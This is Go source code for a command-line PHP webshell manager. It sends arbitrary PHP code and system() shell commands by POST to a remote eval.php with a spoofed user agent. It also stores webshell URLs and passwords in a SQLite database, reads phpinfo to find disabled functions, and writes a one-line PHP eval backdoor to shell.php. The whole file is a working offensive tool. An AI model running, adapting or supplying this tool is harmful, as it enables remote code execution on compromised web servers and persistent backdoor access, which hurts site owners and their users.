package main

import (
	"database/sql"
	"flag"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
)

// 常量定义
const (
	userAgent   = `Mozilla/5.0 (iPod; U; CPU iPhone OS 3_2 like Mac OS X; cmn-TW) AppleWebKit/533.20.7 (KHTML, like Gecko) Version/3.0.5 Mobile/8B119 Safari/6533.20.7`
	contentType = "application/x-www-form-urlencoded"
	httpURL     = "http://test.test/eval.php"
)

// handleError 函数用于处理错误，打印错误消息
func handleError(err error, message string) {
	if err != nil {
		log.Fatalf("%s: %v", message, err)
	}
}

func addURL() {
	var url, passwd, ua, other string
	fmt.Printf("输入添加的url:\t")
	fmt.Scanln(&url)
	fmt.Printf("输入添加的passwd:\t")
	fmt.Scanln(&passwd)
	fmt.Printf("输入添加的ua:\t")
	fmt.Scanln(&ua)
	fmt.Printf("输入备注:\t")
	fmt.Scanln(&other)
	db, err := connectDb()
	handleError(err, "连接数据库出错!")
	//defer func(db *sql.DB) {
	//	_ = db.Close()
	//}(db)
	defer db.Close()
	insertDataSQL := `
    INSERT INTO info (url, passwd, ua, other) VALUES (?, ?, ?, ?);`
	_, err = db.Exec(insertDataSQL, url, passwd, ua, other)
	if err != nil {
		handleError(err, "插入数据出错!")
		return
	}
	fmt.Println("数据已成功添加!")
}

func connectDb() (*sql.DB, error) {
	db, err := sql.Open("sqlite3", "test.db")
	handleError(err, "打开数据库错误!")
	return db, nil
}

func selectDb() {
	db, err := sql.Open("sqlite3", "test.db")
	handleError(err, "打开数据库错误!")
	defer func(db *sql.DB) {
		_ = db.Close()
	}(db)

	rows, err := db.Query("select id, url, passwd, ua from info;")
	handleError(err, "查询数据库错误!")
	defer func(rows *sql.Rows) {
		_ = rows.Close()
	}(rows)

	for rows.Next() {
		var id int
		var url, passwd, ua string
		err := rows.Scan(&id, &url, &passwd, &ua)
		handleError(err, "遍历数据库内容出错!")

		fmt.Printf("id:%d url:%s passwd:%s ua:%s\n", id, url, passwd, ua)
	}
}

func checkFile() {
	_, err := os.Stat("test.db")
	if err == nil {
	} else if os.IsNotExist(err) {
		fmt.Println("检测到数据库配置文件不存在，将创建数据库!")
		createTable()
	} else {
		fmt.Printf("检查文件错误: %v\n", err)
	}
}

func createTable() {
	db, err := sql.Open("sqlite3", "test.db")
	handleError(err, "打开数据库错误!")
	defer func(db *sql.DB) {
		_ = db.Close()
	}(db)

	createTableSQL := `
    CREATE TABLE IF NOT EXISTS info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT NOT NULL,
        passwd TEXT NOT NULL,
        ua TEXT NOT NULL,
        other TEXT NOT NULL
    );`

	_, err = db.Exec(createTableSQL)
	handleError(err, "创建数据库出错!")

	insertDataSQL := `
    INSERT INTO info (url, passwd, ua, other) VALUES (?, ?, ?, ?);`

	_, err = db.Exec(insertDataSQL, "http://test.test", "cmd", "test_ua", "备注信息")
	handleError(err, "插入数据出错!")
}

// makeRequest 函数用于创建并发送 HTTP POST 请求
func makeRequest(payload string) (*http.Response, error) {

	req, err := http.NewRequest("POST", httpURL, strings.NewReader(payload))
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", contentType)

	client := &http.Client{}
	return client.Do(req) // 发送请求并返回响应
}

func shellExec(payload string) {
	shellPayload := "cmd=system('" + payload + "');" // 修改此行，修复字符串拼接问题
	respShell, err := makeRequest(shellPayload)
	handleError(err, "请求执行系统命令失败")
	defer func(body io.ReadCloser) {
		err := body.Close()
		handleError(err, "关闭响应失败")
	}(respShell.Body)

	// 读取和打印系统命令执行响应
	bodyShell, err := io.ReadAll(respShell.Body)
	handleError(err, "读取响应体失败")

	if string(bodyShell) != "" {
		fmt.Println("执行系统命令响应:")
		fmt.Printf("%s", bodyShell)

	}
	//return string(bodyShell)
}

func disableFunctionInfo() {
	// 保存当前的标准输出
	oldStdout := os.Stdout

	// 创建一个黑洞，将标准输出重定向到黑洞
	null, _ := os.Create(os.DevNull)
	os.Stdout = null

	// 执行函数
	textPtr, err := executeCode("phpinfo()")
	handleError(err, "执行phpinfo失败")
	text := *textPtr
	// 在这里不会将输出打印到终端
	// 恢复标准输出
	os.Stdout = oldStdout
	//text := executeCode("phpinfo()")
	//fmt.Println(executeCode("phpinfo()"))
	//re, err := regexp.Compile(`disable_functions</td><td class="v">(.*?)</td>`)
	//
	//handleError(err, "正则表达式编译错误!")
	//result := re.FindAllString(text, -1)
	//fmt.Println("匹配的结果:")
	//for _, match := range result {
	//	content := match[1]
	//	cleanedContent := strings.TrimSpace(content)
	//	fmt.Println(cleanedContent)
	//}
	//编译表达式
	re := regexp.MustCompile(`disable_functions</td><td class="v">(.*?)</td>`)
	matches := re.FindAllStringSubmatch(text, -1)
	// 提取匹配项的内容并输出
	for _, match := range matches {
		// 提取匹配项中的第一个子匹配组（即，<td class="v"> 和 </td> 之间的内容）
		content := match[1]
		//去空
		cleanedContent := strings.TrimSpace(content)
		fmt.Println("过滤了如下函数:\t", cleanedContent)
	}
}

func executeCode(payload string) (*string, error) {
	evalPayload := "cmd=" + payload + ";"
	// 使用 makeRequest 发送 PHP 代码执行请求
	respEval, err := makeRequest(evalPayload)
	handleError(err, "发送payload失败!")
	defer func(body io.ReadCloser) {
		err := body.Close()
		handleError(err, "关闭响应失败!")
	}(respEval.Body)
	bodyEval, err := io.ReadAll(respEval.Body)
	handleError(err, "打印php响应失败! ")
	strbody := string(bodyEval)
	if strbody != "" {
		fmt.Println("执行代码响应:")
		fmt.Printf("%s", bodyEval)
	}
	return &strbody, nil
}

func generateWebShell() {
	text := `<?php eval($_REQUEST['shell']);`
	filename := `shell.php`
	file, err := os.Create(filename)
	handleError(err, "创建文件时出错!")
	io.WriteString(file, text)
	handleError(err, "写入文件出错")
	fmt.Printf("生成文件成功!文件名:%s\n", filename)
}

// printLogo 函数用于打印程序的 Logo 和帮助信息
func printLogo() {
	logo := `
      ____            _
     / ___| ___   ___| | __
    | |  _ / _ \ / __| |/ /
    | |_| | (_) | (__|   <
     \____|\___/ \___|_|\_\
    `
	fmt.Printf("%s\n", logo)
	fmt.Println("--help\t显示完整帮助信息\n--cmd\t输入要执行的 PHP 代码(省略`;`)\n--shell\t利用 system 函数执行系统命令\n--generate-shell 生成简单的web_shell\n--dbinfo 显示目前数据库信息\n--adddb\t添加数据\n--phpinfo\t查看php禁用的函数\n------------华丽的分割线-----------")
}

func main() {
	showHelp := flag.Bool("help", false, "显示帮助信息")
	code := flag.String("cmd", "", "执行 PHP 代码")
	shell := flag.String("shell", "", "利用system函数执行系统命令")
	webShell := flag.Bool("generate-shell", false, "生成php的一句话木马")
	dbInfo := flag.Bool("dbinfo", false, "显示目前数据库信息")
	addDb := flag.Bool("adddb", false, "添加数据")
	disableFunction := flag.Bool("phpinfo", false, "查看php禁用的函数")

	flag.Parse()

	if *showHelp {
		printLogo()
	} else if *code != "" {
		executeCode(*code)
	} else if *shell != "" {
		shellExec(*shell)
	} else if *webShell {
		generateWebShell()
	} else if *dbInfo {
		selectDb()
	} else if *addDb {
		addURL()
	} else if *disableFunction {
		disableFunctionInfo()
	} else {
		printLogo()
	}

	checkFile()
}
